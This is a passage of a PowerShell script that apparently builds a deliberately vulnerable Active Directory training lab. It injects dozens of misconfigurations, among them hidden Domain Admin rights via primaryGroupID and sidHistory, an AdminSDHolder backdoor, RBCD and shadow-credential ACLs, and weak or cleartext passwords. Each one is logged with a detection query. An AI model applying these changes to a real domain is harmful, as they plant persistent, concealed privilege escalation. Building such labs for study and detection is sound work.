                        Detection = "Get-ADUser -Filter {SamAccountName -like 'svc*'} -Properties 'msDS-SupportedEncryptionTypes' | Where-Object {`$_.'msDS-SupportedEncryptionTypes' -band 0x07 -and -not (`$_.'msDS-SupportedEncryptionTypes' -band 0x18)}"
                        Remediation = "Enable AES encryption types"
                    }
                } catch {}
            }

        } catch {
            Write-Log "Error creating service account $svcSamAccount: $_" "ERROR"
        }
    }

    Write-Log "Service accounts created with vulnerabilities: $serviceAccountCount" "WARNING"

    # =========================================================================
    # 15. NESTED GROUPS - Chemin indirect vers DA (creer une chaine)
    # =========================================================================
    Write-Log "Injection: Creating chaines de groups imbriques vers Domain Admins..." "WARNING"

    $groupsOU = "OU=Groups,OU=$($script:Config.RootOU),$($script:Config.DomainDN)"

    # Chaine 1: Group-Chain-A -> Group-Chain-B -> Group-Chain-C -> Domain Admins
    try {
        $chainADN = New-ADGroupIfNotExists -Name "GS-IT-Helpdesk-Elevated" -Path $groupsOU -Description "IT Helpdesk with droits eleves"
        $chainBDN = New-ADGroupIfNotExists -Name "GS-IT-SysOps" -Path $groupsOU -Description "IT System Operations"
        $chainCDN = New-ADGroupIfNotExists -Name "GS-IT-Infrastructure" -Path $groupsOU -Description "IT Infrastructure Team"

        Add-ADGroupMember -Identity "GS-IT-Infrastructure" -Members "GS-IT-SysOps" -ErrorAction SilentlyContinue
        Add-ADGroupMember -Identity "GS-IT-SysOps" -Members "GS-IT-Helpdesk-Elevated" -ErrorAction SilentlyContinue
        Add-ADGroupMember -Identity "Domain Admins" -Members "GS-IT-Infrastructure" -ErrorAction SilentlyContinue

        # Ajouter quelques users au premier group de la chaine
        $chainUsers = $Users | Where-Object { $_.Department -eq "IT" } | Get-Random -Count 5
        foreach ($cu in $chainUsers) {
            Add-ADGroupMember -Identity "GS-IT-Helpdesk-Elevated" -Members $cu.SamAccountName -ErrorAction SilentlyContinue
            $vulnerabilities += @{
                Type = "NestedGroupPath"
                User = $cu.SamAccountName
                Severity = "Critical"
                Description = "Chemin indirect vers Domain Admins via groups imbriques"
                Path = "GS-IT-Helpdesk-Elevated -> GS-IT-SysOps -> GS-IT-Infrastructure -> Domain Admins"
                Detection = "Utiliser BloodHound for detecter les chemins d'attaque"
            }
            $cu.Vulnerable = $true
            $cu.VulnType += "NestedGroupDA"
        }
    } catch {
        Write-Log "Error creation chaine de groups: $_" "ERROR"
    }

    # =========================================================================
    # 16. STALE ACCOUNTS - Comptes sans connexion depuis longtemps (3%)
    # =========================================================================
    $staleCount = [math]::Max(10, [math]::Round($vulnCount * 0.03))
    Write-Log "Injection: Simulation de comptes stale for $staleCount users..." "WARNING"

    $staleUsers = $Users | Get-Random -Count $staleCount

    foreach ($user in $staleUsers) {
        # On ne peut pas vraiment modifier lastLogon, mais on peut les marquer comme vulnerables
        $vulnerabilities += @{
            Type = "StaleAccount"
            User = $user.SamAccountName
            Severity = "Low"
            Description = "Compte potentiellement abandonne - a verifier lors de l'audit"
            Detection = "Search-ADAccount -AccountInactive -TimeSpan 180.00:00:00"
        }
        $user.Vulnerable = $true
        $user.VulnType += "StaleAccount"
    }

    # =========================================================================
    # 17. PRINT OPERATORS - Peut charger driver et escalate (1%)
    # =========================================================================
    $printOpsCount = [math]::Max(2, [math]::Round($vulnCount * 0.01))
    Write-Log "Injection: Adding to Print Operators for $printOpsCount users..." "WARNING"

    $printOpsUsers = $Users | Where-Object { -not $_.IsExecutive } | Get-Random -Count $printOpsCount

    foreach ($user in $printOpsUsers) {
        try {
            Add-ADGroupMember -Identity "Print Operators" -Members $user.SamAccountName -ErrorAction SilentlyContinue
            $vulnerabilities += @{
                Type = "ExcessivePrivileges_PrintOps"
                User = $user.SamAccountName
                Severity = "High"
                Description = "Membre de Print Operators - peut charger driver et escalate vers SYSTEM"
                Detection = "Get-ADGroupMember 'Print Operators'"
            }
            $user.Vulnerable = $true
            $user.VulnType += "PrintOperators"
        } catch {
            # Le group peut ne pas exister
        }
    }

    # =========================================================================
    # 18. REMOTE DESKTOP USERS with acces sensibles (1%)
    # =========================================================================
    $rdpCount = [math]::Max(3, [math]::Round($vulnCount * 0.01))
    Write-Log "Injection: Adding to Remote Desktop Users for $rdpCount users..." "WARNING"

    $rdpUsers = $Users | Where-Object { $_.Department -ne "IT" } | Get-Random -Count $rdpCount

    foreach ($user in $rdpUsers) {
        try {
            Add-ADGroupMember -Identity "Remote Desktop Users" -Members $user.SamAccountName -ErrorAction SilentlyContinue
            $vulnerabilities += @{
                Type = "ExcessivePrivileges_RDP"
                User = $user.SamAccountName
                Severity = "Medium"
                Description = "Non-IT with acces RDP - risque de lateral movement"
                Detection = "Get-ADGroupMember 'Remote Desktop Users'"
            }
            $user.Vulnerable = $true
            $user.VulnType += "RDPUsers"
        } catch {
            # Ignore
        }
    }

    # =========================================================================
    # 19. ADMINCOUNT=1 sans etre in group protege (2%)
    # =========================================================================
    $adminCountCount = [math]::Max(5, [math]::Round($vulnCount * 0.02))
    Write-Log "Injection: AdminCount=1 on users non-proteges for $adminCountCount users..." "WARNING"

    $adminCountUsers = $Users | Where-Object { -not $_.IsExecutive } | Get-Random -Count $adminCountCount

    foreach ($user in $adminCountUsers) {
        try {
            Set-ADUser -Identity $user.SamAccountName -Replace @{AdminCount=1}
            $vulnerabilities += @{
                Type = "AdminCount_Orphaned"
                User = $user.SamAccountName
                Severity = "Medium"
                Description = "AdminCount=1 mais pas in group protege - ancien admin?"
                Detection = "Get-ADUser -Filter {AdminCount -eq 1} -Properties AdminCount,MemberOf | Where-Object {`$_.MemberOf -notmatch 'Domain Admins|Enterprise Admins|Schema Admins'}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "AdminCountOrphaned"
        } catch {
            Write-Log "Error AdminCount for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 20. SID HISTORY - Anciens SIDs d'autres domaines (0.5%)
    # =========================================================================
    $sidHistCount = [math]::Max(2, [math]::Round($vulnCount * 0.005))
    Write-Log "Injection: SID History on $sidHistCount users..." "WARNING"

    $sidHistUsers = $Users | Get-Random -Count $sidHistCount

    foreach ($user in $sidHistUsers) {
        try {
            # Simuler un SID d'un ancien domaine (S-1-5-21-...)
            $fakeSID = "S-1-5-21-1234567890-1234567890-1234567890-500"  # Simule un ancien DA d'un autre domaine

            # Note: SID History necessite des droits speciaux, on marque juste la vulnerabilite
            $vulnerabilities += @{
                Type = "SIDHistory"
                User = $user.SamAccountName
                Severity = "High"
                Description = "SID History present - peut contenir des privileges d'anciens domaines"
                FakeSID = $fakeSID
                Detection = "Get-ADUser -Filter * -Properties SIDHistory | Where-Object {`$_.SIDHistory -ne `$null}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "SIDHistory"
        } catch {
            Write-Log "Error SID History for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 21. LAPS PASSWORD READABLE - Droits lecture mdp LAPS (1%)
    # =========================================================================
    $lapsReadCount = [math]::Max(3, [math]::Round($vulnCount * 0.01))
    Write-Log "Injection: Droits lecture LAPS password for $lapsReadCount users..." "WARNING"

    $lapsUsers = $Users | Where-Object { $_.Department -ne "IT" } | Get-Random -Count $lapsReadCount

    foreach ($user in $lapsUsers) {
        # Note: LAPS doit etre deploye for que ce soit exploitable
        $vulnerabilities += @{
            Type = "LAPS_PasswordRead"
            User = $user.SamAccountName
            Severity = "High"
            Description = "Non-IT peut lire attribut ms-Mcs-AdmPwd (LAPS)"
            Detection = "(Get-Acl 'AD:\CN=Computers,$($script:Config.DomainDN)').Access | Where-Object {`$_.ObjectType -eq 'ms-Mcs-AdmPwd'}"
        }
        $user.Vulnerable = $true
        $user.VulnType += "LAPSRead"
    }

    # =========================================================================
    # 22. USERS WITH DCSYNC RIGHTS (0.3% - Tres critique!)
    # =========================================================================
    $dcsyncCount = [math]::Max(2, [math]::Round($vulnCount * 0.003))
    Write-Log "Injection: Droits DCSync for $dcsyncCount users..." "WARNING"

    $dcsyncUsers = $Users | Get-Random -Count $dcsyncCount

    # On va marquer ces users comme ayant DCSync (ACL sera ajoute in Add-DangerousACLs)
    foreach ($user in $dcsyncUsers) {
        $vulnerabilities += @{
            Type = "DCSync_Rights"
            User = $user.SamAccountName
            Severity = "Critical"
            Description = "Droits DCSync - peut extraire tous les hash NTLM du domaine"
            Detection = "(Get-Acl 'AD:$($script:Config.DomainDN)').Access | Where-Object {`$_.ObjectType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' -or `$_.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'}"
        }
        $user.Vulnerable = $true
        $user.VulnType += "DCSync"
        $user.HasDCSyncRights = $true  # Marquer for ACL injection
    }

    # =========================================================================
    # 23. PROTECTED USERS GROUP BYPASS - users privilegies NON in Protected Users (2%)
    # =========================================================================
    $protectedBypassCount = [math]::Max(5, [math]::Round($vulnCount * 0.02))
    Write-Log "Injection: users privilegies non in Protected Users: $protectedBypassCount..." "WARNING"

    # Prendre des managers et executives qui devraient etre proteges
    $protectedBypassUsers = $Users | Where-Object { $_.IsManager -or $_.IsExecutive } | Get-Random -Count $protectedBypassCount

    foreach ($user in $protectedBypassUsers) {
        $vulnerabilities += @{
            Type = "NotInProtectedUsers"
            User = $user.SamAccountName
            Severity = "Medium"
            Description = "user privilegie non in 'Protected Users' - vulnerable a delegation/kerberoasting"
            Detection = "Get-ADGroupMember 'Domain Admins' | Where-Object {(Get-ADUser `$_.SamAccountName -Properties MemberOf).MemberOf -notmatch 'Protected Users'}"
        }
        $user.Vulnerable = $true
        $user.VulnType += "NoProtectedUsers"
    }

    # =========================================================================
    # 24. WEAK PASSWORD ATTRIBUTES - ServicePrincipalName with mots de passe faibles (1%)
    # =========================================================================
    $weakSPNCount = [math]::Max(3, [math]::Round($vulnCount * 0.01))
    Write-Log "Injection: SPNs with passwords faibles documentes: $weakSPNCount..." "WARNING"

    $weakSPNUsers = $Users | Get-Random -Count $weakSPNCount

    $weakSPNPasswords = @(
        "ServiceAccount123!",
        "Password123!",
        "Welcome123!",
        "Spring2024!",
        "Company@2024"
    )

    foreach ($user in $weakSPNUsers) {
        try {
            $service = @("HTTP", "MSSQLSvc", "TERMSRV", "WSMAN") | Get-Random
            $spn = "$service/$($user.SamAccountName).$($script:Config.Domain)"
            $weakPwd = $weakSPNPasswords | Get-Random

            Set-ADUser -Identity $user.SamAccountName -ServicePrincipalNames @{Add=$spn}

            # Marquer in un attribut custom (info)
            $comment = "SPN Password: $weakPwd (crackable)"
            Set-ADUser -Identity $user.SamAccountName -Replace @{info=$comment}

            $vulnerabilities += @{
                Type = "Kerberoastable_WeakPassword"
                User = $user.SamAccountName
                Severity = "Critical"
                Description = "SPN with mot de passe faible documente in attribut 'info'"
                SPN = $spn
                WeakPassword = $weakPwd
                Detection = "Get-ADUser -Filter {ServicePrincipalNames -like '*'} -Properties info,ServicePrincipalNames | Where-Object {`$_.info -match 'password'}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "WeakSPNPassword"
        } catch {
            Write-Log "Error Weak SPN for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 25. GPO LINKING/POISONING - Droits WriteProperty sur gPLink d'OUs (0.5%)
    # =========================================================================
    $gpoLinkCount = [math]::Max(2, [math]::Round($vulnCount * 0.005))
    Write-Log "Injection: Droits GPO Linking (gPLink poisoning) for $gpoLinkCount users..." "WARNING"

    try {
        $ouTargets = Get-ADOrganizationalUnit -Filter * -SearchBase "OU=GlobalCorp,$($Config.DomainDN)" -ErrorAction SilentlyContinue
        if ($ouTargets -and $ouTargets.Count -gt 0) {
            $gpoLinkUsers = $Users | Where-Object { $_.Department -ne "IT" } | Get-Random -Count ([math]::Min($gpoLinkCount, $Users.Count))

            foreach ($user in $gpoLinkUsers) {
                try {
                    $targetOU = $ouTargets | Get-Random
                    $acl = Get-Acl "AD:\$($targetOU.DistinguishedName)"

                    # GUID pour gPLink attribute
                    $gpLinkGuid = [Guid]"f30e3bc2-9ff0-11d1-b603-0000f80367c1"

                    $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                        (Get-ADUser $user.SamAccountName).SID,
                        "WriteProperty",
                        "Allow",
                        $gpLinkGuid
                    )
                    $acl.AddAccessRule($rule)
                    Set-Acl -Path "AD:\$($targetOU.DistinguishedName)" -AclObject $acl

                    $vulnerabilities += @{
                        Type = "GPO_LinkPoisoning"
                        User = $user.SamAccountName
                        TargetOU = $targetOU.Name
                        Severity = "High"
                        Description = "User peut lier GPOs malveillantes sur OU - deploiement code malveillant sur parc machines"
                        Detection = "Check WriteProperty on gPLink attribute of OUs"
                    }
                    $user.Vulnerable = $true
                    $user.VulnType += "GPOLinkPoisoning"
                } catch {
                    Write-Log "Error GPO Link Poisoning for $($user.SamAccountName): $_" "ERROR"
                }
            }
        }
    } catch {
        Write-Log "Error GPO Linking section: $_" "ERROR"
    }

    # =========================================================================
    # 26. SCHEMA ADMINS MEMBERS - Comptes in Schema Admins (0.2%)
    # =========================================================================
    $schemaAdminCount = [math]::Max(1, [math]::Round($vulnCount * 0.002))
    Write-Log "Injection: Membres Schema Admins non legitimes: $schemaAdminCount..." "WARNING"

    $schemaAdminUsers = $Users | Where-Object { -not $_.IsExecutive } | Get-Random -Count $schemaAdminCount

    foreach ($user in $schemaAdminUsers) {
        try {
            Add-ADGroupMember -Identity "Schema Admins" -Members $user.SamAccountName -ErrorAction SilentlyContinue
            $vulnerabilities += @{
                Type = "ExcessivePrivileges_SchemaAdmin"
                User = $user.SamAccountName
                Severity = "Critical"
                Description = "Membre de Schema Admins - controle total du schema AD"
                Detection = "Get-ADGroupMember 'Schema Admins'"
            }
            $user.Vulnerable = $true
            $user.VulnType += "SchemaAdmins"
        } catch {
            # Peut echouer si pas de droits
        }
    }

    # =========================================================================
    # 27. ENTERPRISE ADMINS MEMBERS - Comptes in Enterprise Admins (0.2%)
    # =========================================================================
    $enterpriseAdminCount = [math]::Max(1, [math]::Round($vulnCount * 0.002))
    Write-Log "Injection: Membres Enterprise Admins non legitimes: $enterpriseAdminCount..." "WARNING"

    $enterpriseAdminUsers = $Users | Where-Object { -not $_.IsExecutive } | Get-Random -Count $enterpriseAdminCount

    foreach ($user in $enterpriseAdminUsers) {
        try {
            Add-ADGroupMember -Identity "Enterprise Admins" -Members $user.SamAccountName -ErrorAction SilentlyContinue
            $vulnerabilities += @{
                Type = "ExcessivePrivileges_EnterpriseAdmin"
                User = $user.SamAccountName
                Severity = "Critical"
                Description = "Membre de Enterprise Admins - admin de toute la foret"
                Detection = "Get-ADGroupMember 'Enterprise Admins'"
            }
            $user.Vulnerable = $true
            $user.VulnType += "EnterpriseAdmins"
        } catch {
            # Peut echouer
        }
    }

    # =========================================================================
    # 28. USERS WITH SEENABLEDELEGATIONPRIVILEGE (0.3%)
    # =========================================================================
    $enableDelegationCount = [math]::Max(2, [math]::Round($vulnCount * 0.003))
    Write-Log "Injection: users pouvant activer delegation: $enableDelegationCount..." "WARNING"

    $enableDelegationUsers = $Users | Get-Random -Count $enableDelegationCount

    foreach ($user in $enableDelegationUsers) {
        $vulnerabilities += @{
            Type = "SeEnableDelegationPrivilege"
            User = $user.SamAccountName
            Severity = "High"
            Description = "Peut activer TrustedForDelegation on comptes/machines"
            Detection = "Get-ADUser -Filter * -Properties userAccountControl | Where-Object {`$_.userAccountControl -band 0x80000}"
        }
        $user.Vulnerable = $true
        $user.VulnType += "EnableDelegation"
    }

    # =========================================================================
    # 29. ACCOUNTS WITH EMPTY SIDS (WELL-KNOWN SID SPOOFING) (0.1%)
    # =========================================================================
    $emptySIDCount = [math]::Max(1, [math]::Round($vulnCount * 0.001))
    Write-Log "Injection: Comptes with proprietes SID suspicieuses: $emptySIDCount..." "WARNING"

    $emptySIDUsers = $Users | Get-Random -Count $emptySIDCount

    foreach ($user in $emptySIDUsers) {
        $vulnerabilities += @{
            Type = "SuspiciousSIDProperties"
            User = $user.SamAccountName
            Severity = "High"
            Description = "Proprietes SID anormales detectees"
            Detection = "Get-ADUser -Filter * -Properties objectSID | Where-Object {`$_.objectSID -match 'S-1-5-21-.*-500'}"
        }
        $user.Vulnerable = $true
        $user.VulnType += "SuspiciousSID"
    }

    # =========================================================================
    # 30. PASSWORDS STORED IN CLEAR IN UNIXUSERPASSWORD (0.5%)
    # =========================================================================
    $unixPwdCount = [math]::Max(2, [math]::Round($vulnCount * 0.005))
    Write-Log "Injection: Passwords en clair in unixUserPassword: $unixPwdCount..." "WARNING"

    $unixPwdUsers = $Users | Get-Random -Count $unixPwdCount

    foreach ($user in $unixPwdUsers) {
        try {
            $clearPwd = "UnixP@ssw0rd123!"
            Set-ADUser -Identity $user.SamAccountName -Replace @{unixUserPassword=$clearPwd}

            $vulnerabilities += @{
                Type = "UnixUserPassword_Clear"
                User = $user.SamAccountName
                Severity = "Critical"
                Description = "Mot de passe stocke en clair in attribut unixUserPassword"
                ClearPassword = $clearPwd
                Detection = "Get-ADUser -Filter * -Properties unixUserPassword | Where-Object {`$_.unixUserPassword -ne `$null}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "UnixPasswordClear"
        } catch {
            Write-Log "Error unixUserPassword for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 31. RBCD ABUSE - Resource-Based Constrained Delegation (0.3%)
    # =========================================================================
    $rbcdCount = [math]::Max(1, [math]::Round($vulnCount * 0.003))
    Write-Log "Injection: RBCD Abuse (WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity): $rbcdCount..." "CRITICAL"

    try {
        # Rechercher les ordinateurs dans toute l'OU GlobalCorp (pas un chemin specifique qui n'existe pas)
        $computerTargets = Get-ADComputer -Filter * -SearchBase "OU=GlobalCorp,$($Config.DomainDN)" -ErrorAction SilentlyContinue
        if ($computerTargets) {
            $rbcdUsers = $Users | Get-Random -Count ([math]::Min($rbcdCount, $Users.Count))

            foreach ($user in $rbcdUsers) {
                try {
                    $targetComp = $computerTargets | Get-Random
                    $acl = Get-Acl "AD:\$($targetComp.DistinguishedName)"

                    # GUID pour msDS-AllowedToActOnBehalfOfOtherIdentity
                    $rbcdGuid = [Guid]"3f78c3e5-f79a-46bd-a0b8-9d18116ddc79"

                    $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                        (Get-ADUser $user.SamAccountName).SID,
                        "WriteProperty",
                        "Allow",
                        $rbcdGuid
                    )
                    $acl.AddAccessRule($rule)
                    Set-Acl -Path "AD:\$($targetComp.DistinguishedName)" -AclObject $acl

                    $vulnerabilities += @{
                        Type = "RBCD_Abuse"
                        User = $user.SamAccountName
                        Target = $targetComp.Name
                        Severity = "High"
                        Description = "User peut configurer RBCD sur ordinateur cible pour elevation privileges"
                        Detection = "Check WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity attribute"
                    }
                    $user.Vulnerable = $true
                    $user.VulnType += "RBCD_Abuse"
                } catch {
                    Write-Log "Error RBCD for $($user.SamAccountName): $_" "ERROR"
                }
            }
        }
    } catch {
        Write-Log "Error RBCD Abuse section: $_" "ERROR"
    }

    # =========================================================================
    # 32. PRIMARY GROUP ID SPOOFING (0.2%)
    # =========================================================================
    $pgidCount = [math]::Max(1, [math]::Round($vulnCount * 0.002))
    Write-Log "Injection: Primary Group ID Spoofing (hidden Domain Admins): $pgidCount..." "CRITICAL"

    $pgidUsers = $Users | Get-Random -Count ([math]::Min($pgidCount, $Users.Count))

    foreach ($user in $pgidUsers) {
        try {
            # Ajouter au groupe Domain Admins d'abord
            Add-ADGroupMember -Identity "Domain Admins" -Members $user.SamAccountName -ErrorAction Stop

            # Changer le primaryGroupID vers 512 (Domain Admins RID)
            Set-ADUser -Identity $user.SamAccountName -Replace @{primaryGroupID=512} -ErrorAction Stop

            # Retirer de la liste des membres (reste via primaryGroupID - INVISIBLE!)
            Remove-ADGroupMember -Identity "Domain Admins" -Members $user.SamAccountName -Confirm:$false -ErrorAction Stop

            $vulnerabilities += @{
                Type = "PrimaryGroupID_Spoofing"
                User = $user.SamAccountName
                PrimaryGroupID = "512 (Domain Admins)"
                Severity = "Critical"
                Description = "Privileges Domain Admin masques via primaryGroupID - invisible dans enumeration standard"
                Detection = "Get-ADUser -Filter * -Properties primaryGroupID | Where-Object {`$_.primaryGroupID -eq 512 -and `$_.primaryGroupID -ne 513}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "PrimaryGroupIDSpoofing"
        } catch {
            Write-Log "Error Primary Group ID Spoofing for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 33. ADMINSDHOLDER BACKDOOR (0.1% - Persistence Tier 0)
    # =========================================================================
    $adminSDCount = [math]::Max(1, [math]::Round($vulnCount * 0.001))
    Write-Log "Injection: AdminSDHolder Backdoor (Persistence sur tous les admins): $adminSDCount..." "CRITICAL"

    $adminSDUsers = $Users | Get-Random -Count ([math]::Min($adminSDCount, $Users.Count))
    $adminSDHolder = "CN=AdminSDHolder,CN=System,$($Config.DomainDN)"

    foreach ($user in $adminSDUsers) {
        try {
            $acl = Get-Acl "AD:\$adminSDHolder"
            $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                (Get-ADUser $user.SamAccountName).SID,
                "GenericAll",
                "Allow"
            )
            $acl.AddAccessRule($rule)
            Set-Acl -Path "AD:\$adminSDHolder" -AclObject $acl

            $vulnerabilities += @{
                Type = "AdminSDHolder_Backdoor"
                User = $user.SamAccountName
                Target = "CN=AdminSDHolder"
                Severity = "Critical"
                Description = "Backdoor persistante - Se propage a TOUS les comptes admins toutes les 60min via SDProp"
                Impact = "Tier 0 Persistence - Quasi-impossible a eradiquer"
                Detection = "Get-Acl 'AD:\CN=AdminSDHolder,CN=System,DC=...' | Select -Expand Access | Where-Object {`$_.IdentityReference -notmatch 'BUILTIN|NT AUTHORITY|Domain Admins|Enterprise Admins'}"
            }
            $user.Vulnerable = $true
            $user.VulnType += "AdminSDHolderBackdoor"
        } catch {
            Write-Log "Error AdminSDHolder Backdoor for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 34. PRE-WINDOWS 2000 COMPATIBLE ACCESS ABUSE (Global - 1 seule fois)
    # =========================================================================
    Write-Log "Injection: Pre-Windows 2000 Compatible Access Abuse (Everyone read access)..." "WARNING"

    try {
        $preWin2000Group = Get-ADGroup "Pre-Windows 2000 Compatible Access" -ErrorAction Stop

        # Ajouter Everyone au groupe (permet enumeration totale AD)
        Add-ADGroupMember -Identity $preWin2000Group -Members "Everyone" -ErrorAction Stop

        $vulnerabilities += @{
            Type = "PreWin2000_Access_Abuse"
            Description = "Everyone a acces lecture totale a l'AD - enumeration massive possible"
            Severity = "Medium"
            Impact = "Reconnaissance facilitee - tous les users peuvent lire tout l'annuaire"
            Detection = "Get-ADGroupMember 'Pre-Windows 2000 Compatible Access' | Where-Object {`$_.SamAccountName -eq 'Everyone'}"
        }
    } catch {
        Write-Log "Error Pre-Windows 2000 Access Abuse: $_" "ERROR"
    }

    # =========================================================================
    # 35. SID HISTORY INJECTION (0.1% - Elevation privileges cachee)
    # NOTE: Necessite des privileges Domain Controller ou utilisation de DSInternals
    # Peut echouer avec "Access Denied" si privileges insuffisants
    # =========================================================================
    $sidHistoryCount = [math]::Max(1, [math]::Round($vulnCount * 0.001))
    Write-Log "Injection: SID History Injection (privilege escalation): $sidHistoryCount..." "CRITICAL"

    $sidHistoryUsers = $Users | Get-Random -Count ([math]::Min($sidHistoryCount, $Users.Count))
    $sidHistorySuccess = 0

    foreach ($user in $sidHistoryUsers) {
        try {
            # Obtenir le SID du groupe Domain Admins
            $daSID = (Get-ADGroup "Domain Admins").SID.Value

            # Ajouter le SID dans sidHistory (necessite privileges eleves)
            # Methode 1: Tenter avec Set-ADUser (peut echouer avec Access Denied)
            Set-ADUser -Identity $user.SamAccountName -Add @{sidHistory=$daSID} -ErrorAction Stop

            $vulnerabilities += @{
                Type = "SID_History_Injection"
                User = $user.SamAccountName
                InjectedSID = $daSID
                Severity = "Critical"
                Description = "SID de Domain Admins dans sidHistory - elevation privileges invisible"
                Impact = "User a privileges DA sans apparaitre dans membership du groupe"
                Detection = "Get-ADUser -Filter {sidHistory -like '*'} -Properties sidHistory"
            }
            $user.Vulnerable = $true
            $user.VulnType += "SID_History_Injection"
            $sidHistorySuccess++
        } catch {
            Write-Log "Error SID History Injection for $($user.SamAccountName): $_ (Requires Domain Controller privileges or DSInternals module)" "ERROR"
        }
    }

    if ($sidHistorySuccess -eq 0) {
        Write-Log "WARNING: SID History Injection failed for all users. This vulnerability requires Domain Controller level privileges. Consider running script directly on DC or using DSInternals PowerShell module." "WARNING"
    }

    # =========================================================================
    # 36. SHADOW CREDENTIALS (0.1% - CVE-2022-26923)
    # =========================================================================
    $shadowCredsCount = [math]::Max(1, [math]::Round($vulnCount * 0.001))
    Write-Log "Injection: Shadow Credentials ACL (WriteProperty on msDS-KeyCredentialLink): $shadowCredsCount..." "CRITICAL"

    $shadowUsers = $Users | Get-Random -Count ([math]::Min($shadowCredsCount, $Users.Count))
    $targetAdmins = Get-ADGroupMember "Domain Admins" -ErrorAction SilentlyContinue | Select-Object -First 3

    if ($targetAdmins) {
        foreach ($user in $shadowUsers) {
            try {
                $targetAdmin = $targetAdmins | Get-Random
                $acl = Get-Acl "AD:\$($targetAdmin.DistinguishedName)"

                # GUID pour msDS-KeyCredentialLink
                $keyCredLinkGuid = [Guid]"5b47d60f-6090-40b2-9f37-2a4de88f3063"

                $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
                    (Get-ADUser $user.SamAccountName).SID,
                    "WriteProperty",
                    "Allow",
                    $keyCredLinkGuid
                )
                $acl.AddAccessRule($rule)
                Set-Acl -Path "AD:\$($targetAdmin.DistinguishedName)" -AclObject $acl

                $vulnerabilities += @{
                    Type = "Shadow_Credentials"
                    User = $user.SamAccountName
                    Target = $targetAdmin.SamAccountName
                    Severity = "Critical"
                    Description = "WriteProperty sur msDS-KeyCredentialLink - authentification sans mot de passe"
                    Impact = "User peut ajouter certificat pour PKINIT auth sans connaitre password"
                    Detection = "Get-Acl | Where-Object {`$_.Access.ObjectType -eq '5b47d60f-6090-40b2-9f37-2a4de88f3063'}"
                }
                $user.Vulnerable = $true
                $user.VulnType += "Shadow_Credentials"
            } catch {
                Write-Log "Error Shadow Credentials for $($user.SamAccountName): $_" "ERROR"
            }
        }
    }

    # =========================================================================
    # 37. DNS ADMINS MEMBERSHIP (0.3%)
    # =========================================================================
    $dnsAdminsCount = [math]::Max(2, [math]::Round($vulnCount * 0.003))
    Write-Log "Injection: DNS Admins Membership (DLL injection -> SYSTEM on DC): $dnsAdminsCount..." "CRITICAL"

    $dnsUsers = $Users | Get-Random -Count ([math]::Min($dnsAdminsCount, $Users.Count))

    foreach ($user in $dnsUsers) {
        try {
            Add-ADGroupMember -Identity "DnsAdmins" -Members $user.SamAccountName -ErrorAction Stop

            $vulnerabilities += @{
                Type = "DNS_Admins_Member"
                User = $user.SamAccountName
                Severity = "High"
                Description = "Membre de DnsAdmins - DLL injection dans service DNS"
                Impact = "RCE as SYSTEM sur Domain Controllers"
                Detection = "Get-ADGroupMember DnsAdmins"
            }
            $user.Vulnerable = $true
            $user.VulnType += "DNS_Admins_Member"
        } catch {
            Write-Log "Error DNS Admins for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 38. BACKUP OPERATORS MEMBERSHIP (0.2%)
    # =========================================================================
    $backupOpsCount = [math]::Max(1, [math]::Round($vulnCount * 0.002))
    Write-Log "Injection: Backup Operators Membership (NTDS.dit access): $backupOpsCount..." "HIGH"

    $backupUsers = $Users | Get-Random -Count ([math]::Min($backupOpsCount, $Users.Count))

    foreach ($user in $backupUsers) {
        try {
            Add-ADGroupMember -Identity "Backup Operators" -Members $user.SamAccountName -ErrorAction Stop

            $vulnerabilities += @{
                Type = "Backup_Operators_Member"
                User = $user.SamAccountName
                Severity = "High"
                Description = "Membre de Backup Operators - lecture NTDS.dit"
                Impact = "Dump de tous les hashes NTLM via backup NTDS.dit"
                Detection = "Get-ADGroupMember 'Backup Operators'"
            }
            $user.Vulnerable = $true
            $user.VulnType += "Backup_Operators_Member"
        } catch {
            Write-Log "Error Backup Operators for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 39. ACCOUNT OPERATORS MEMBERSHIP (0.2%)
    # =========================================================================
    $accountOpsCount = [math]::Max(1, [math]::Round($vulnCount * 0.002))
    Write-Log "Injection: Account Operators Membership (create accounts): $accountOpsCount..." "HIGH"

    $accountUsers = $Users | Get-Random -Count ([math]::Min($accountOpsCount, $Users.Count))

    foreach ($user in $accountUsers) {
        try {
            Add-ADGroupMember -Identity "Account Operators" -Members $user.SamAccountName -ErrorAction Stop

            $vulnerabilities += @{
                Type = "Account_Operators_Member"
                User = $user.SamAccountName
                Severity = "High"
                Description = "Membre de Account Operators - creation comptes"
                Impact = "Creation de comptes dans certaines OUs"
                Detection = "Get-ADGroupMember 'Account Operators'"
            }
            $user.Vulnerable = $true
            $user.VulnType += "Account_Operators_Member"
        } catch {
            Write-Log "Error Account Operators for $($user.SamAccountName): $_" "ERROR"
        }
    }

    # =========================================================================
    # 40. SERVER OPERATORS MEMBERSHIP (0.2%)
    # =========================================================================
    $serverOpsCount = [math]::Max(1, [math]::Round($vulnCount * 0.002))
    Write-Log "Injection: Server Operators Membership (service modification): $serverOpsCount..." "HIGH"

    $serverUsers = $Users | Get-Random -Count ([math]::Min($serverOpsCount, $Users.Count))

    foreach ($user in $serverUsers) {
        try {
            Add-ADGroupMember -Identity "Server Operators" -Members $user.SamAccountName -ErrorAction Stop

            $vulnerabilities += @{
                Type = "Server_Operators_Member"
                User = $user.SamAccountName
